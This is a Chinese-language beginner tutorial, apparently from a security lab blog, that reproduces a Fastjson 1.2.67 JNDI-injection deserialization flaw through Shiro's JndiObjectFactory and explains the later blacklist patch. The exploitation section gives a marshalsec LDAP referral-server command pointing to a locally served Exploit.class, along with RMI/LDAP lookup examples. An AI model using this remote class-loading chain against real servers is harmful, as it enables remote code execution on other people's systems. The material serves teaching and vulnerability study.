目前网上的资源整理不是针对入门玩家，都需要一定的java漏洞调试基础，本文从一个简单的FastJson
漏洞开始，搭建漏洞环境，分析漏洞成因，使用条件等。从入门者的角度看懂并复现漏洞触发，拥有属于自己的一套漏洞调试环境。

# 0x01 Fastjson简介

Fastjson 是Alibaba的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从
JSON 字符串反序列化到 JavaBean。  
https://github.com/alibaba/fastjson

# 0x02 环境搭建

JDK 版本：8u112

fastjson: 1.2.67

shiro: 1.5.1

slf4j-nop: 1.7.25

## 0x1 添加依赖包

为了快速添加项目所需要的jar包，创建Maven项目如下

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/e0f6be6e077c469d900269af0983805c?from=pc)

pom.xml

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/a92a9b37a3be4dac8926371f659789ed?from=pc)

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p3-tt.byteimg.com/large/pgc-image/f9181ef97a7d48eab496e11efc97a1e0?from=pc)

之后右键pom.xml 点击下载source和document

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/dd41c4765733419489857b2b239688b0?from=pc)

## 0x2 选择JDK版本

该漏洞选择JDK 8u112

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/f7a837dfbe48464da4053591e9009ba7?from=pc)

## 0x3 编写漏洞代码

在main文件夹中添加漏洞代码,核心在于调用了fastjson.JSON的parseObject 函数

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p3-tt.byteimg.com/large/pgc-image/6d509526945242afb4766e9f6ff3fe9f?from=pc)

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p1-tt.byteimg.com/large/pgc-image/e4b4d5cf83ac42b8a2b26dbf6d727f07?from=pc)

# 0x03 漏洞原理

## 0x1 FastJson 类解析

Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化。

FastJson中的 parse 和 parseObject方法都可以用来将JSON字符串反序列化成Java对象，parseObject 本质上也是调用
parse 进行反序列化的。但是 parseObject 会额外的将Java对象转为 JSONObject对象，即
JSON.toJSON。所以进行反序列化时的细节区别在于，parse 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而
parseObject 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。

fastjson.java

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/7fdc466a5d0d41188f31882a0275fd7c?from=pc)

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p1-tt.byteimg.com/large/pgc-image/5bc4a97527504c30856c51a5f5a9f027?from=pc)

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/7a6d2046a39c4e3e91145d0806bb***3?from=pc)

由结果可以看出调用parseObject 函数会调用getattr方法。

## 0x2 漏洞调用链分析

调用栈分析

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p1-tt.byteimg.com/large/pgc-image/7db6ee4ff1c94ed1a35fc7a97930bac6?from=pc)

### 1\. parseObject 对象类型转换

这一步的操作是将obj对应的对象类型转化为json格式，这势必要方位getattr 对象方法，从而触发漏洞。

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/b9190580886b43e89cae76ebf5be40b3?from=pc)

### 2\. 反射调用

通过invoke方法，调用getinstance方法

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p1-tt.byteimg.com/large/pgc-image/83e3d8559f1d4332b45eb7e41a60272a?from=pc)

### 3\. 触发ldap

在JndiObjectFactory getinstance 中调用了this.lookup(resourceName)

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p3-tt.byteimg.com/large/pgc-image/c52959e8122b44de994e52618e3671ff?from=pc)

## 0x3 JNDI 注入

Java Name Directory Interface，Java命名和目录接口（JNDI）是一种Java
API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。JNDI包括Naming Service和Directory
Service，通过名称来寻找数据和对象的API，也称为一种绑定。JNDI可访问的现有的目录及服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA。

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/bbde60810cbe4a80be2f3236649fdf95?from=pc)

其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。

注入方法：

  1. JNDI Reference 配合 RMI
  2. JNDI Reference 配合 LDAP

RMI格式:ctx.lookup("  
rmi://localhost:9999/refObj");

LDAP格式ctx.lookup("  
ldap://localhost:9999/refObj");

若lookup函数中的参数攻击者可控，便可以指向攻击者的服务器，即可实现JNDI注入实现任意代码执行。

### 1 RMI

RMI（Remote Method
Invocation，远程方法调用）。远程方法调用是分布式编程中的一个基本思想，实现远程方法调用的技术有CORBA、WebService等（这两种独立于编程语言）。RMI则是专门为JAVA设计，依赖JRMP通讯协议。

### 2 LDAP

LDAP（Lightweight Directory Access Protocol
，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP以树结构标识所以不能像表格一样用SQL语句查询，它“读”性能很强，但“写”性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。

该漏洞简单的将利用org.apache.shiro 包中的jndi功能访问自己搭建的ldap服务，获取并执行自己编译的Exploit.class文件。

# 0x04 漏洞利用

## 0x1 编译Java 利用代码

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/435ec8add47d427db15118fe2f740796?from=pc)

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p1-tt.byteimg.com/large/pgc-image/fb14ffbd9c7a47269***830008c9867b?from=pc)

## 0x2 开启 LDAP 服务

使用marshalsec启动一个ladp服务器 ，下载地址为  
https://github.com/mbechler/marshalsec

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
http://127.0.0.1:8089/#Exploit

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p3-tt.byteimg.com/large/pgc-image/c7ecad96560e49d688655d4f382b92ee?from=pc)

## 0x3 开启HTTP Web 服务

将编译好的Exploit.class 放在web目录下并开启服务

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/111b1d937a194f228103391c88ad3303?from=pc)

# 0x05 漏洞补丁

这个链接梳理了fastjson hash对应的jar，可以方便的寻找已经被过滤的jar包  
https://github.com/LeadroyaL/fastjson-blacklist

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/f8cd201adbc546d4bf27ab7999885216?from=pc)

该漏洞采用黑名单的方式进行修补，在1.2.68中把org.apache.shiro.jndi 给ban掉了

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/e506c03432574161a8b15507d8b3012f?from=pc)

对应的具体代码如下图所示，在 public Class<?> checkAutoType(String typeName, Class<?>
expectClass, int features) 函数中有对应处理

黑名单hash生成算法，大概思路是将每一位都异或进行异或叠加。

![初识Fastjson漏洞（环境搭建及漏洞复现）](http://p6-tt.byteimg.com/large/pgc-image/fe826feaa89345b08c5d9d9c5bbe6778?from=pc)

> 本文项目链接  
>
> https://github.com/ctlyz123/fastjson_vulhttp://xxlegend.com/2018/10/23/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/https://paper.seebug.org/994/#0x01-fastjson

合天网安实验室实验推荐：Java反序列漏洞

https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015111916202700001

# 本文系合天智汇原创，转载请注明出处。

  

